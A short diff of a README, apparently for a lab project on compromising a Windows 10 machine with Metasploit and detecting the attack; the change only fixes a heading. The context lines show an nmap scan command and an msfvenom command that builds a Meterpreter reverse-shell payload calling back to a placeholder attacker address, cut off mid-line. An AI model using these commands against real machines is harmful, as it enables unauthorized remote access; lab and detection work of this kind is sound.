@@ -14,7 +14,7 @@ The objective of this project is to compromise a Windows 10 machine and detect t
 Payload: `windows/meterpreter/reverse_tcp` \
 Tools used: Metasploit framework (`msfvenom`, `msfconsole`)
 
-###Steps taken:
+### Steps taken:
 1. Find an open port using nmap -A -Pn <Victim IP address>
 2. Generate the payload using:
 `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<host IP address> lport=<host unused port>
